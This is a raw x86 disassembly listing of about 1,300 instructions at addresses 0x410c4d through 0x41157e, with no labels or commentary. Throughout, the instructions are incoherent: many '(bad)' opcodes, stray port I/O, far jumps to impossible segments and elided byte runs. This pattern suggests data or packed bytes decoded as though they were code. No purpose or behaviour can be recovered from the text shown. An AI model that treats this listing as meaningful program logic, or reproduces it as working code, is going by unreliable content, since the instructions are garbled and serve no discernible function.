  410c4d:	adc    DWORD PTR [eax-0x20311d93],esi
  410c53:	out    dx,eax
  410c54:	adc    bp,WORD PTR [ebp+0x58]
  410c58:	fcmove st,st(6)
  410c5a:	xchg   esi,eax
  410c5b:	add    al,0x40
  410c5d:	xor    ah,BYTE PTR [edx-0x59]
  410c60:	stos   DWORD PTR es:[edi],eax
  410c61:	mov    BYTE PTR [esi+0x2842bb65],0xdc
  410c68:	mov    bl,0xce
  410c6a:	xchg   BYTE PTR [esi+0x5bcf48aa],ah
  410c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c71:	mov    ah,BYTE PTR [esi+0x65]
  410c74:	call   0x56ce:0x926d5008
  410c7b:	out    dx,eax
  410c7c:	fwait
  410c7d:	mov    esp,0xce8327ae
  410c82:	inc    esi
  410c83:	scas   eax,DWORD PTR es:[edi]
  410c84:	addr16 (bad) 
  410c86:	dec    esi
  410c87:	gs jb  0x410cd2
  410c8a:	iret   
  410c8b:	pop    ebx
  410c8c:	int3   
  410c8d:	nop
  410c8e:	or     BYTE PTR [esi],dh
  410c90:	jmp    0xe982c863
  410c95:	into   
  410c96:	cmc    
  410c97:	arpl   WORD PTR es:[esi-0x328c2520],bx
  410c9e:	cmc    
  410c9f:	push   ss
  410ca0:	repz jmp 0xcef21ba3
  410ca6:	mov    ebx,0xf5cea10d
  410cab:	inc    BYTE PTR [eax]
	...
  410cbd:	add    BYTE PTR [eax],al
  410cbf:	add    BYTE PTR [edx],bh
  410cc1:	sahf   
  410cc2:	loopne 0x410cbe
  410cc4:	je     0x410c93
  410cc6:	cmc    
  410cc7:	out    dx,al
  410cc8:	jmp    0x7bce:0xa8e6fded
  410ccf:	stc    
  410cd0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  410cd2:	xor    al,0xd6
  410cd4:	push   0x70f97bce
  410cd9:	or     cl,dl
  410cdb:	mov    esi,0x34f5ce68
  410ce0:	call   0x68f8879a
  410ce5:	into   
  410ce6:	cmc    
  410ce7:	je     0x410d30
  410ce9:	(bad)  
  410cea:	cmc    
  410ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cec:	aaa    
  410ced:	mov    bl,0x36
  410cef:	sahf   
  410cf0:	xor    dh,cl
  410cf2:	mov    ebx,0xf5ce3099
  410cf7:	or     DWORD PTR [eax-0x71],0x82886f5
  410cfe:	in     eax,0x76
  410d00:	xor    dh,cl
  410d02:	loopne 0x410ca9
  410d04:	imul   ecx,ebp,0xb5ea6ef5
  410d0a:	std    
  410d0b:	data16 sub BYTE PTR [ebp-0x310ee039],dh
  410d12:	cmc    
  410d13:	pushf  
  410d14:	jecxz  0x410cdc
  410d16:	cmc    
  410d17:	dec    esi
  410d18:	xlat   BYTE PTR ds:[ebx]
  410d19:	pop    es
  410d1a:	aaa    
  410d1b:	add    dl,cl
  410d1d:	cmp    dh,dh
  410d1f:	mov    ch,0xd5
  410d21:	inc    eax
  410d22:	idiv   bh
	...
  410d38:	int    0x2c
  410d3a:	xor    al,0xff
  410d3c:	stos   BYTE PTR es:[edi],al
  410d3d:	cmp    BYTE PTR [eax+edi*8+0x7c],cl
  410d41:	or     ah,dh
  410d43:	jmp    FWORD PTR [edx-0x720383c8]
  410d49:	nop
  410d4a:	pop    ds
  410d4b:	add    BYTE PTR ds:0x250cc78a,ah
  410d51:	fiadd  WORD PTR [edx-0xe724914]
  410d57:	push   0x35
  410d59:	jmp    0x410d9d
  410d5b:	jmp    DWORD PTR [eax+0x6ebdedc9]
  410d61:	xor    esi,esi
  410d63:	mov    DWORD PTR [eax-0x128a09cc],esi
  410d69:	mov    eax,0x98a46934
  410d6e:	cmc    
  410d6f:	xor    eax,0x48e02d
  410d74:	mov    ebp,0x1afff46b
  410d79:	xor    DWORD PTR [eax+ecx*1+0x4d],edi
  410d7d:	jae    0x410dde
  410d7f:	inc    ecx
  410d80:	in     eax,0xb8
  410d82:	pop    es
  410d83:	add    BYTE PTR [ebp+0x18e2ee10],dh
  410d89:	xor    esi,esi
  410d8b:	jmp    DWORD PTR [eax-0x428a09cc]
  410d91:	cmp    ch,al
  410d93:	cmp    ebp,DWORD PTR [edx]
  410d95:	xor    eax,eax
  410d97:	ret    0x90b1
  410d9a:	pop    ebx
  410d9b:	mov    eax,DWORD PTR [eax]
	...
  410dad:	add    BYTE PTR [eax],al
  410daf:	add    BYTE PTR [ecx],bl
  410db1:	adc    eax,0x90bffcca
  410db6:	bound  ecx,QWORD PTR [edx+ebp*8-0x13]
  410dba:	or     eax,0x16e98ce8
  410dbf:	(bad)  
  410dc0:	jnp    0x410df7
  410dc2:	mov    edi,0x9bde4fb
  410dc7:	out    dx,eax
  410dc8:	sub    ah,dh
  410dca:	jge    0x410e34
  410dcc:	int    0xbd
  410dce:	loope  0x410d6e
  410dd0:	in     eax,0xfc
  410dd2:	or     edi,edi
  410dd4:	fld    st(5)
  410dd6:	popa   
  410dd7:	pop    esi
  410dd8:	mov    bl,0xaa
  410dda:	imul   edi,esi,0x7469a1b9
  410de0:	test   BYTE PTR [ebp-0x6cccc591],dl
  410de6:	inc    ebx
  410de7:	rcl    DWORD PTR [eax+0x308ab0bd],0x3d
  410dee:	inc    eax
  410def:	iret   
  410df0:	and    edi,DWORD PTR [ebx-0x4e367396]
  410df6:	mov    ecx,0x6ab981fe
  410dfb:	je     0x410d91
  410dfd:	aad    0x38
  410dff:	sub    cl,BYTE PTR [ebp+edi*4+0x3883c006]
  410e06:	lock add DWORD PTR [ebp+edi*4-0x421bbbbe],ecx
  410e0e:	or     DWORD PTR [eax],eax
  410e10:	mov    edx,?
  410e12:	shl    bl,0x0
	...
  410e25:	add    BYTE PTR [eax],al
  410e27:	add    bl,dl
  410e29:	mov    edx,0xbd360009
  410e2e:	jecxz  0x410e2f
  410e30:	xor    eax,0x8ffe3bd
  410e35:	jno    0x410e87
  410e37:	dec    edi
  410e38:	add    DWORD PTR [ecx],edi
  410e3a:	pop    ebp
  410e3b:	imul   BYTE PTR [ebx+0x19feb94a]
  410e41:	inc    ebp
  410e42:	push   0x74
  410e44:	cwde   
  410e45:	adc    eax,0x948c286b
  410e4a:	fisttp WORD PTR [esi]
  410e4c:	dec    esp
  410e4d:	inc    eax
  410e4e:	in     al,dx
  410e4f:	ins    BYTE PTR es:[edi],dx
  410e50:	pop    ebx
  410e51:	xchg   ebp,eax
  410e52:	fild   WORD PTR [ebx]
  410e54:	in     al,0x0
  410e56:	test   al,0xc4
  410e58:	jae    0x410e24
  410e5a:	mov    ah,0xf
  410e5c:	je     0x410ec2
  410e5e:	mov    al,ds:0x6a646262
  410e63:	xor    ecx,DWORD PTR [eax]
  410e65:	adc    DWORD PTR [edx+ebx*2],edi
  410e68:	push   edx
  410e69:	retf   
  410e6a:	scas   eax,DWORD PTR es:[edi]
  410e6b:	mov    ch,0x33
  410e6d:	push   esp
  410e6e:	mov    al,ds:0x651d4262
  410e73:	cmp    eax,DWORD PTR [edx-0x35]
  410e76:	push   es
  410e77:	imul   ebx,DWORD PTR [ecx],0xffffff89
  410e7a:	push   cs
  410e7b:	bound  esi,QWORD PTR [ebp-0x4bb6686c]
  410e81:	push   ebp
  410e82:	fbld   TBYTE PTR [edx-0x20]
  410e85:	jmp    0x410e85
  410e87:	popa   
  410e88:	adc    cl,bl
  410e8a:	push   esp
  410e8b:	or     al,0x0
	...
  410e9d:	add    BYTE PTR [eax],al
  410e9f:	add    ah,dh
  410ea1:	sub    al,0x20
  410ea3:	popa   
  410ea4:	add    bl,BYTE PTR ds:0xcb025465
  410eaa:	(bad)  
  410eab:	out    dx,al
  410eac:	repz xor ch,BYTE PTR [ebx+ebp*8-0x68496bb4]
  410eb4:	mov    ebx,0xda61bec2
  410eb9:	inc    eax
  410eba:	out    0x6b,eax
  410ebc:	push   ecx
  410ebd:	push   esp
  410ebe:	scas   al,BYTE PTR es:[edi]
  410ebf:	popa   
  410ec0:	adc    al,0x11
  410ec2:	test   BYTE PTR [ecx-0x3e],bl
  410ec5:	retf   0x409
  410ec8:	and    al,0xc6
  410eca:	or     bl,al
  410ecc:	mov    bl,0xc9
  410ece:	xor    al,0x3c
  410ed0:	mov    ds:0x186176ca,al
  410ed5:	pushf  
  410ed6:	or     BYTE PTR [ecx+0x6ef58ab1],al
  410edc:	pop    es
  410edd:	adc    cl,ah
  410edf:	pop    esi
  410ee0:	in     eax,dx
  410ee1:	retf   0x6483
  410ee4:	int3   
  410ee5:	ret    0x56f5
  410ee8:	inc    eax
  410ee9:	xor    al,BYTE PTR [ecx]
  410eeb:	ret    
  410eec:	dec    esi
  410eed:	retf   0x7cf6
  410ef0:	test   al,0xc2
  410ef2:	cmc    
  410ef3:	ds in  eax,dx
  410ef5:	inc    eax
  410ef6:	add    BYTE PTR [ecx+0x51],al
  410ef9:	mov    dh,ch
  410efb:	cs pop es
  410efd:	adc    ebp,ebp
  410eff:	push   ds
  410f00:	lods   eax,DWORD PTR ds:[esi]
  410f01:	retf   0xe962
	...
  410f18:	aaa    
  410f19:	stos   BYTE PTR es:[edi],al
  410f1a:	bound  ebp,QWORD PTR [eax+0x31bbc98f]
  410f20:	aad    0xca
  410f22:	cmc    
  410f23:	push   es
  410f24:	inc    ebx
  410f25:	xchg   edx,eax
  410f26:	loopne 0x410ef9
  410f28:	dec    edi
  410f29:	retf   
  410f2a:	cmc    
  410f2b:	pusha  
  410f2c:	adc    ebp,edx
  410f2e:	std    
  410f2f:	out    dx,al
  410f30:	lods   al,BYTE PTR ds:[esi]
  410f31:	sbb    BYTE PTR [ecx+edi*4+0x39f5ca64],cl
  410f38:	lock and DWORD PTR [edx+0x28],0xb1bbc990
  410f40:	push   esp
  410f41:	retf   0xc6f5
  410f44:	ret    0xe091
  410f47:	icebp  
  410f48:	iret   
  410f49:	retf   0x60f5
  410f4c:	adc    ah,dh
  410f4e:	std    
  410f4f:	scas   al,BYTE PTR es:[edi]
  410f50:	ins    BYTE PTR es:[edi],dx
  410f51:	push   ss
  410f52:	mov    ah,0x99
  410f54:	fs retf 0xe9f5
  410f58:	fstp   TBYTE PTR [esi]
  410f5a:	mov    DWORD PTR [ebx+ebp*1-0x3e],edx
  410f5e:	cmc    
  410f5f:	mov    cs,WORD PTR [edi+0x36006a40]
  410f65:	sub    ch,dh
  410f67:	mul    DWORD PTR [edx]
  410f69:	xor    al,0xf5
  410f6b:	jae    0x410fe9
  410f6d:	mov    eax,0xf312fff5
  410f72:	div    BYTE PTR [ebp-0x7b]
  410f75:	cmp    eax,0x34e2397a
  410f7a:	div    BYTE PTR [ebp+0x0]
	...
  410f90:	aad    0x6c
  410f92:	idiv   bh
  410f94:	ret    0x5e2
  410f97:	call   0x36be56
  410f9c:	mov    ds:0xa2f7e222,al
  410fa1:	xor    al,0xf6
  410fa3:	jne    0x410fda
  410fa5:	cmp    eax,0x347239b0
  410faa:	div    BYTE PTR [ebp-0x99363]
  410fb0:	mov    ds:0xcee805e2,al
  410fb5:	scas   al,BYTE PTR es:[edi]
  410fb6:	cmc    
  410fb7:	call   DWORD PTR [edx+0x22f7d222]
  410fbd:	imul   esi,esi,0xf66c89b5
  410fc3:	jmp    DWORD PTR [edx]
  410fc5:	fild   WORD PTR ds:0xf5a75ee8
  410fcb:	jmp    edx
  410fcd:	sub    dl,dh
  410fcf:	mul    edx
  410fd1:	push   0x3cf575f6
  410fd6:	cmp    BYTE PTR [ecx],0xd2
  410fd9:	push   0x6105bd8a
  410fde:	idiv   bh
  410fe0:	in     eax,0xe0
  410fe2:	sub    BYTE PTR [eax-0x1c],ch
  410fe5:	xchg   esp,eax
  410fe6:	in     eax,0xbe
  410fe8:	repnz jmp 0xfff5:0xa7c4e805
  410ff0:	mov    WORD PTR [edx],fs
  410ff2:	nop
  410ff3:	iret   
	...
  411008:	mov    ebx,0xe1fe5619
  41100d:	es pop esi
  41100f:	(bad)  
  411010:	mov    ds:0xa40fcf49,eax
  411015:	or     eax,0x3993ff15
  41101a:	iret   
  41101b:	jnp    0x8437454a
  411021:	addr16 push ebp
  411023:	je     0x410fa9
  411025:	push   ebp
  411026:	and    al,0xfe
  411028:	jae    0x411081
  41102a:	push   ebp
  41102b:	mov    ah,0x44
  41102d:	xchg   DWORD PTR [ebp-0x2],edx
  411030:	je     0x411000
  411032:	adc    eax,0x8f7f5bff
  411037:	out    dx,eax
  411038:	pop    ebx
  411039:	ja     0x411090
  41103b:	out    0x71,eax
  41103d:	mov    cl,0x56
  41103f:	inc    BYTE PTR [ebx+0x61]
  411042:	js     0x41103a
  411044:	cmp    ebx,DWORD PTR [edi-0x698fe69c]
  41104a:	push   ebp
  41104b:	(bad)  
  41104c:	loope  0x410ff3
  41104e:	pop    ebp
  41104f:	(bad)  
  411050:	and    esp,DWORD PTR [esi-0x40e4c3fb]
  411056:	push   esi
  411057:	mov    ah,0x28
  411059:	mov    edi,0xb9f4fe56
  41105e:	adc    eax,0x90e703ff
  411063:	fild   WORD PTR [ebx]
  411065:	fist   WORD PTR [esi-0x19]
  411068:	cmc    
  411069:	mov    ds:0xfe55,al
	...
  41107e:	add    BYTE PTR [eax],al
  411080:	jmp    0x4110ca
  411082:	cmp    eax,0x6206e3f6
  411087:	in     eax,dx
  411088:	xchg   edi,eax
  411089:	(bad)  
  41108a:	push   esi
  41108b:	dec    BYTE PTR [ecx+0x5]
  41108e:	gs stc 
  411090:	leave  
  411091:	xchg   esp,eax
  411092:	scas   al,BYTE PTR es:[edi]
  411093:	pop    esi
  411094:	ret    0x9341
  411097:	imul   eax,DWORD PTR [ebp-0x3afc2084],0xffffffd2
  41109e:	rol    DWORD PTR [ebx],cl
  4110a0:	inc    ecx
  4110a1:	sbb    ebx,DWORD PTR [edx+eax*4+0x419c8cf]
  4110a8:	es pop ecx
  4110aa:	jle    0x411084
  4110ac:	mov    edi,DWORD PTR [edi+ebx*8+0x78c78b1c]
  4110b3:	enter  0xc787,0xdc
  4110b7:	or     esp,esp
  4110b9:	cli    
  4110ba:	enter  0x73c4,0xc6
  4110be:	sbb    al,0x3c
  4110c0:	rcl    DWORD PTR [ebp-0x21],cl
  4110c3:	imul   eax,DWORD PTR [edx],0xffffffc9
  4110c6:	ss pop esi
  4110c8:	pop    edx
  4110c9:	inc    ecx
  4110ca:	out    0xeb,eax
  4110cc:	and    eax,0xb403a03d
  4110d1:	xchg   edx,eax
  4110d2:	fild   WORD PTR [ebx]
  4110d4:	or     al,0xbc
  4110d6:	fs pusha 
  4110d8:	cmp    al,bh
  4110da:	push   ds
  4110db:	fdiv   DWORD PTR [edi]
  4110dd:	(bad)  
  4110de:	pushf  
  4110df:	or     esi,DWORD PTR [ebx+eiz*4]
  4110e2:	enter  0x5e,0x0
	...
  4110f6:	add    BYTE PTR [eax],al
  4110f8:	and    bl,ch
  4110fa:	and    DWORD PTR [edi],eax
  4110fc:	mov    WORD PTR [ecx+0x6a],fs
  4110ff:	outs   dx,DWORD PTR ds:[esi]
  411100:	push   cs
  411101:	shl    bl,1
  411103:	mov    ah,0x62
  411105:	cmp    bl,bh
  411107:	jmp    0xc9dd85d
  41110c:	in     al,0x0
  41110e:	sbb    BYTE PTR [ebp-0xe],bl
  411111:	sbb    al,0x2d
  411113:	pusha  
  411114:	push   ss
  411115:	sub    DWORD PTR [ebx],0x7a944ccc
  41111b:	pop    ds
  41111c:	ins    BYTE PTR es:[edi],dx
  41111d:	pop    esp
  41111e:	or     BYTE PTR [eax],ch
  411120:	mov    BYTE PTR [esi+esi*1],dl
  411123:	jmp    0x2ca1610b
  411128:	mov    dh,0x53
  41112a:	or     BYTE PTR [esi],dh
  41112c:	sub    ch,ah
  41112e:	sub    eax,0xc89b8fe9
  411133:	adc    eax,0xcfe060a9
  411138:	retf   0xf5c5
  41113b:	sbb    DWORD PTR [eax-0xd790a3a],ebp
  411141:	cs inc esi
  411143:	add    ecx,DWORD PTR [edi-0x3a]
  411146:	inc    ebp
  411147:	pop    bx
  411149:	mov    fs,eax
  41114b:	sbb    esp,DWORD PTR [edi+eax*8-0xb]
  41114f:	inc    ecx
  411150:	xchg   ebp,eax
  411151:	mov    ebp,esi
  411153:	dec    esi
  411154:	cmc    
  411155:	xchg   esp,eax
  411156:	dec    esi
  411157:	imul   eax,DWORD PTR [edx+0x437b94],0x0
	...
  41116d:	add    BYTE PTR [eax],al
  41116f:	add    BYTE PTR [edx-0x36],dl
  411172:	cmp    DWORD PTR [ecx],ebp
  411174:	test   esi,0xc3e92ef5
  41117a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41117b:	loope  0x411105
  41117d:	aas    
  41117e:	mov    cl,0x1e
  411180:	arpl   dx,cx
  411182:	cmc    
  411183:	pushf  
  411184:	xchg   DWORD PTR [ebp+ebx*4+0x55c6c8d1],edi
  41118b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41118c:	(bad)  
  41118d:	ror    DWORD PTR [ecx+ebp*8],cl
  411190:	loop   0x4111ac
  411192:	in     eax,0x6a
  411194:	(bad)  
  411195:	leave  
  411196:	(bad)  
  411197:	jmp    0x5d366891
  41119c:	nop
  41119d:	mov    esp,0xc659212f
  4111a2:	jg     0x4111d0
  4111a4:	ins    BYTE PTR es:[edi],dx
  4111a5:	cmp    ecx,DWORD PTR [eax]
  4111a7:	inc    ecx
  4111a8:	lds    edi,FWORD PTR [ebx]
  4111aa:	inc    edi
  4111ab:	add    ch,dh
  4111ad:	mov    ecx,0x90a46a52
  4111b2:	cmc    
  4111b3:	xor    eax,0x48d9fd
  4111b8:	int    0x68
  4111ba:	xor    al,0xff
  4111bc:	jmp    0x6e00:0x8c74c89c
  4111c3:	add    BYTE PTR [ebp+0x4968b338],ah
  4111c9:	mov    ebx,0x67850048
  4111ce:	jl     0x4111d8
  4111d0:	std    
  4111d1:	push   edx
  4111d2:	push   0xffffffff
	...
  4111e8:	sbb    bh,BYTE PTR [ecx]
  4111ea:	mov    edi,0x6d68fa3a
  4111ef:	add    BYTE PTR [ebp+0x38],dh
  4111f2:	mov    bl,0x68
  4111f4:	jmp    0x4d415ab4
  4111f9:	adc    al,0x60
  4111fb:	inc    ecx
  4111fc:	jne    0x411266
  4111fe:	jl     0x411208
  411200:	mov    ebp,0x9aff6a61
  411205:	push   0xde9afc7c
  41120a:	or     eax,0xf5a893e8
  41120f:	(bad)  
  411210:	jl     0x411265
  411212:	or     DWORD PTR [eax],eax
  411214:	add    BYTE PTR [edx+eiz*8],bl
  411217:	and    DWORD PTR [ecx+0x65],0x5b
  41121b:	push   edi
  41121c:	setno  BYTE PTR [edx+0x50]
  411220:	mov    bl,dh
  411222:	or     eax,0xf5a05de8
  411227:	jmp    FWORD PTR [esi+ecx*8+0x5408bf1]
  41122e:	dec    esi
  41122f:	inc    ecx
  411230:	cmc    
  411231:	adc    eax,0xcfbd6035
  411236:	cmc    
  411237:	jg     0x4111c5
  411239:	sahf   
  41123a:	or     al,0x74
  41123c:	push   ecx
  41123d:	push   ebx
  41123e:	jne    0x4112a9
  411240:	dec    ebp
  411241:	mov    ebx,0x8cf1e7ba
  411246:	or     al,0x0
  411248:	xchg   ebx,edi
  41124a:	fcomp  DWORD PTR [esi]
	...
  411260:	(bad)  
  411262:	adc    eax,DWORD PTR [ebx+eax*8-0x13]
  411266:	mov    esp,0x62bb8c67
  41126b:	mov    ebp,0x40e65824
  411270:	mov    WORD PTR [ebx+0x23947451],cs
  411276:	enter  0x9b62,0x45
  41127a:	fs dec ebp
  41127c:	push   esi
  41127d:	ds push ecx
  41127f:	jmp    0xe08c:0x3d8c7b8d
  411286:	push   ebx
  411287:	inc    ebp
  411288:	js     0x411229
  41128a:	dec    esp
  41128b:	mov    eax,0xfe516b73
  411290:	pop    esi
  411291:	inc    esp
  411292:	adc    al,0x7
  411294:	fst    DWORD PTR [esi]
  411296:	push   edx
  411297:	je     0x4112f1
  411299:	adc    edi,0x7
  41129c:	sbb    BYTE PTR fs:[edx],bl
  41129f:	dec    DWORD PTR [ebx+0x13]
  4112a2:	mov    al,0xc8
  4112a4:	dec    esi
  4112a5:	mov    dl,0x9
  4112a7:	push   ebp
  4112a8:	pop    es
  4112a9:	xchg   edx,eax
  4112aa:	(bad)  
  4112ab:	ret    
  4112ac:	xor    BYTE PTR [ebx+edi*4],al
  4112af:	imul   ecx,DWORD PTR [edi+edx*1-0x3a660143],0xc2634961
  4112ba:	push   edx
  4112bb:	mov    cl,cl
  4112bd:	leave  
  4112be:	xchg   BYTE PTR [eax+ebp*2],dh
  4112c1:	cmc    
  4112c2:	int3   
  4112c3:	inc    DWORD PTR [eax]
	...
  4112d5:	add    BYTE PTR [eax],al
  4112d7:	add    BYTE PTR [esi],dl
  4112d9:	xchg   ebp,eax
  4112da:	sub    al,0xe4
  4112dc:	push   ebx
  4112dd:	push   ebp
  4112de:	fild   WORD PTR [ebx-0x3eac6b4e]
  4112e4:	jae    0x4112eb
  4112e6:	dec    edx
  4112e7:	(bad)
  4112ea:	xlat   BYTE PTR ds:[ebx]
  4112eb:	loop   0x41129e
  4112ed:	xchg   esp,eax
  4112ee:	fisttp WORD PTR [esi]
  4112f0:	int3   
  4112f1:	dec    eax
  4112f2:	fidiv  WORD PTR [ecx+0x5b22ffb3]
  4112f8:	ret    0x1764
  4112fb:	add    al,0x8c
  4112fd:	mov    bl,0x55
  4112ff:	jmp    0x4112cf
  411301:	and    BYTE PTR cs:[esp+edi*1],al
  411305:	ret    
  411306:	sbb    al,0xc
  411308:	mov    ah,0xdb
  41130a:	add    DWORD PTR [ebx-0x66],ebx
  41130d:	lods   al,BYTE PTR ds:[esi]
  41130e:	(bad)  
  41130f:	sbb    al,0x93
  411311:	ret    
  411312:	mov    al,BYTE PTR [edx+edx*8]
  411315:	adc    al,0xa6
  411317:	add    edi,ecx
  411319:	mov    esi,0xd4be57a5
  41131e:	test   al,0x5a
  411320:	jb     0x4112e5
  411322:	pop    esi
  411323:	push   ebp
  411324:	cmp    DWORD PTR [esi+ebp*8-0x30],edi
  411328:	es ret 
  41132a:	mov    ah,0x57
  41132c:	pop    edx
  41132d:	dec    ecx
  41132e:	imul   DWORD PTR [ebx-0x59]
  411331:	mov    edi,DWORD PTR [esi]
  411333:	pop    edx
  411334:	jmp    0xb494:0x8f452862
  41133b:	mov    es,WORD PTR [eax]
	...
  41134d:	add    BYTE PTR [eax],al
  41134f:	add    BYTE PTR [edi],ah
  411351:	pop    ss
  411352:	sub    al,0x57
  411354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411355:	xchg   esp,eax
  411356:	mov    DWORD PTR [ebp+0x6be7492a],esi
  41135c:	push   ecx
  41135d:	mov    cl,BYTE PTR [esi]
  41135f:	pop    edx
  411360:	add    al,0x59
  411362:	repz jmp 0xc38f:0xa8082e41
  41136a:	jnp    0x41134d
  41136c:	ja     0x4113bf
  41136e:	call   0x7c036959
  411373:	fst    QWORD PTR [ebp+0x48]
  411376:	add    cl,al
  411378:	inc    edi
  411379:	mov    ebp,esi
  41137b:	into   
  41137c:	push   edi
  41137d:	aad    0xc
  41137f:	jmp    0x6b2621ae
  411384:	dec    esp
  411385:	jecxz  0x4113e5
  411387:	mov    dh,0xdb
  411389:	mov    fs,eax
  41138b:	and    al,0xa6
  41138d:	ret    
  41138e:	cmc    
  41138f:	repnz dec edi
  411391:	dec    eax
  411392:	or     edi,DWORD PTR [edi]
  411394:	inc    edi
  411395:	aad    0x0
  411397:	jmp    0x3a396bae
  41139c:	inc    ebp
  41139d:	dec    eax
  41139e:	add    al,0x91
  4113a0:	cmp    eax,0x817ef581
  4113a5:	aam    0x5
  4113a7:	ins    DWORD PTR es:[edi],dx
  4113a8:	cwde   
  4113a9:	xchg   ebx,eax
  4113aa:	or     cl,ch
  4113ac:	in     al,0x48
  4113ae:	hlt    
  4113af:	push   ecx
  4113b0:	cmp    bh,BYTE PTR [ebp-0xb]
  4113b3:	pop    esi
	...
  4113c8:	pop    es
  4113c9:	pop    ecx
  4113ca:	in     al,0x56
  4113cc:	pop    ebx
  4113cd:	mov    esi,0xc2ebd4f5
  4113d2:	jnp    0x411415
  4113d4:	call   0xb57f431a
  4113d9:	push   cs
  4113da:	jl     0x411421
  4113dc:	mov    bh,0xf1
  4113de:	or     cl,ch
  4113e0:	(bad)  
  4113e1:	sub    al,0x53
  4113e3:	xchg   edx,eax
  4113e4:	dec    esi
  4113e5:	ret    0x115b
  4113e8:	adc    edi,DWORD PTR [ecx+0x8]
  4113eb:	jmp    0xe4bce888
  4113f0:	mov    dh,0xf8
  4113f2:	or     BYTE PTR [eax],al
  4113f4:	and    eax,0xfdf08196
  4113f9:	or     ah,BYTE PTR [ebx+0x41]
  4113fc:	cmc    
  4113fd:	sub    eax,0x95f523d5
  411402:	or     eax,esi
  411404:	jl     0x4113d8
  411406:	in     eax,dx
  411407:	push   0x48af48
  41140c:	stos   DWORD PTR es:[edi],eax
  41140d:	xor    BYTE PTR [ebp+0x25],dh
  411410:	cmc    
  411411:	xchg   ebp,eax
  411412:	add    eax,eax
  411414:	cwde   
  411415:	shl    eax,0x80
  411418:	in     eax,0x95
  41141a:	or     BYTE PTR [edx-0xaac1b],cl
  411420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411421:	or     dh,bh
  411423:	jne    0x411442
  411425:	cs mov ebp,0x195a523
  41142b:	rol    BYTE PTR [eax],0x0
	...
  41143e:	add    BYTE PTR [eax],al
  411440:	mov    DWORD PTR [eax+0x5d094580],edi
  411446:	jl     0x411430
  411448:	std    
  411449:	inc    esp
  41144a:	dec    ebp
  41144b:	call   DWORD PTR [edx]
  41144d:	push   cs
  41144e:	dec    ebp
  41144f:	loopne 0x411453
  411451:	shr    ecx,cl
  411453:	(bad)  
  411454:	js     0x41148b
  411456:	in     eax,dx
  411457:	jns    0x411495
  411459:	pop    esp
  41145a:	test   BYTE PTR [ebx],0xa5
  41145d:	shl    DWORD PTR [edx],1
  41145f:	rcl    DWORD PTR [eax+0x61],1
  411462:	pop    edi
  411463:	add    al,al
  411465:	add    ch,dl
  411467:	push   eax
  411468:	rcl    dl,cl
  41146a:	aad    0xe8
  41146c:	cmp    BYTE PTR [edx+0x552efff6],0x79
  411473:	es dec ebp
  411475:	xchg   esi,eax
  411476:	or     bh,ch
  411478:	mov    bl,0x5c
  41147a:	jl     0x411484
  41147c:	popf   
  41147d:	add    eax,0xaa8cff3d
  411482:	push   eax
  411483:	je     0x4114b9
  411485:	xchg   edx,eax
  411486:	mov    BYTE PTR [edi],0x24
  411489:	push   edx
  41148a:	push   es
  41148b:	call   DWORD PTR [ebx]
  41148d:	ret    0xe3c3
  411490:	or     eax,DWORD PTR [eax+0x69]
  411493:	(bad)  
  411494:	jns    0x411449
  411496:	popa   
  411497:	ins    BYTE PTR es:[edi],dx
  411498:	sar    DWORD PTR [edx-0x348601a3],0x64
  41149f:	jge    0x411445
  4114a1:	jmp    0x0:0x595d
	...
  4114b8:	inc    esp
  4114b9:	xor    edi,esp
  4114bb:	jg     0x411457
  4114bd:	stos   DWORD PTR es:[edi],eax
  4114be:	push   cs
  4114bf:	test   DWORD PTR [ebx+0x2],ecx
  4114c2:	pop    esi
  4114c3:	(bad)  
  4114c4:	xor    al,0xad
  4114c6:	or     edi,ebp
  4114c8:	add    dh,dl
  4114ca:	xlat   BYTE PTR ds:[ebx]
  4114cb:	pop    es
  4114cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114cd:	mov    edi,0x21b3ff18
  4114d2:	fdivr  st,st(3)
  4114d4:	stos   DWORD PTR es:[edi],eax
  4114d5:	lahf   
  4114d6:	pusha  
  4114d7:	(bad)  
  4114d8:	sbb    DWORD PTR [ebx+0x1a613c61],esi
  4114de:	pop    esi
  4114df:	(bad)  
  4114e0:	sbb    DWORD PTR [edi],ecx
  4114e2:	gs dec ebp
  4114e4:	les    eax,FWORD PTR [esi+0x5d]
  4114e7:	mov    ecx,cs
  4114e9:	cmp    eax,0x77f9e7bc
  4114ee:	pop    ebp
  4114ef:	(bad)  
  4114f0:	scas   al,BYTE PTR es:[di]
  4114f2:	mov    ebx,0x9b64ec8
  4114f7:	push   ebp
  4114f8:	pop    ss
  4114f9:	or     BYTE PTR [ecx-0x38b68f3d],0xfb
  411500:	mov    esp,0x4b0bd77e
  411505:	add    DWORD PTR [edx],eax
  411507:	call   0x4daef3
  41150c:	xchg   DWORD PTR [edi+ebx*1-0x1f92f6f9],edx
  411513:	add    ecx,DWORD PTR [edx+ebp*1+0x2b64ebdf]
  41151a:	mov    al,ds:0x3
	...
  41152f:	add    BYTE PTR [ebx],bl
  411531:	dec    edx
  411532:	sti    
  411533:	push   esi
  411534:	cwde   
  411535:	mov    WORD PTR [edi],ss
  411537:	pop    ds
  411538:	(bad)  
  411539:	mov    edi,0xbc488cfe
  41153e:	mov    DWORD PTR [ebx],eax
  411540:	fs jle 0x41159d
  411543:	(bad)
  411546:	pop    esp
  411547:	or     bl,ch
  411549:	dec    ecx
  41154a:	out    0x6b,eax
  41154c:	jge    0x4115c9
  41154e:	(bad)  
  41154f:	push   esi
  411550:	add    al,0x5a
  411552:	mov    bl,0x88
  411554:	dec    eax
  411555:	mov    eax,0x2b50ec0f
  41155a:	and    BYTE PTR [ebx+eax*8],al
  41155d:	dec    ecx
  41155e:	rcl    DWORD PTR [esi+0x40],cl
  411561:	mov    WORD PTR [edi-0x69408aa6],ss
  411567:	mov    WORD PTR [eax-0x3c],ss
  41156a:	or     DWORD PTR [esp+esi*1],eax
  41156d:	push   eax
  41156e:	or     al,ch
  411570:	fwait
  411571:	mov    esi,0x499307f4
  411576:	imul   DWORD PTR [ebx+0x71]
  411579:	jp     0x4115f9
  41157b:	push   esi
  41157c:	adc    al,0x59
  41157e:	jae    0x411569
